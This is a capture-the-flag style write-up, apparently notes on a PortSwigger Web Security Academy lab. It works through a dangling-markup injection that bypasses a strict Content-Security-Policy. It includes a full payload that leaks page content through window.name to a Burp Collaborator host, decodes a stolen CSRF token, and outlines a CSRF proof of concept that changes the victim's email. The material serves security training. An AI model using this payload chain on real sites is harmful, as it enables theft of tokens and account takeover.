
after detecting we can capture that email post that have xss vulnerability
but the web responses show us :

    Content-Security-Policy: default-src 'self';object-src 'none'; style-src 'self'; script-src 'self'; img-src 'self'; base-uri 'none';


show we can write script in that



write payload to trick user to click

example:
<script>
    if(window.name) {
        new Image().src='//BURP-COLLABORATOR-SUBDOMAIN?'+encodeURIComponent(window.name);
        } else {
            location = 'https://YOUR-LAB-ID.web-security-academy.net/my-account?email=%22%3E%3Ca%20href=%22https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit%22%3EClick%20me%3C/a%3E%3Cbase%20target=%27';
    }
</script>

encode:
'https://YOUR-LAB-ID.web-security-academy.net/my-account?email=%22%3E%3Ca%20href=%22https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit%22%3EClick%20me%3C/a%3E%3Cbase%20target=%27'

decode :

'https://YOUR-LAB-ID.web-security-academy.net/my-account?email=">
<a href="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit">Click me</a><base target='''


analyst:
    first, window.name ="" 
    afer run else they click and run URL exploit but the show URL lab id, but window.name has change to all the following behind target
    and that run if logic, send this to burp collaborator with all the following behind target, that have csrf
    we can post change email we csrf in burprepeater


our payload:

<script>
    if(window.name) {
        new Image().src= 'https://749s755s6eb6a01wcpl7jyeojfp5du.oastify.com?' + encodeURIComponent(window.name);
    } else {
        location = 'https://0a000069040a396cc19aaf3b002000c9.web-security-academy.net/my-account?email=%22%3E%3Ca%20href=%22https://exploit-0a9b0002049139d7c1c6ae53017b000f.exploit-server.net/exploit%22%3EClick%20me%3C/a%3E%3Cbase%20target=%27';
    }

</script>


after deliver to victim :
we poll and see http responses, take this and decode we have csrf value:fC8rmP8WGebYyXu0BPhyDSD8lt3si0Zz

">
                            <input required type="hidden" name="csrf" value="fC8rmP8WGebYyXu0BPhyDSD8lt3si0Zz">
                            <button class=



Generate CSRF PoC to request Post/change-email
Include auto-submit script and copy html, store in exploit web => solve lab
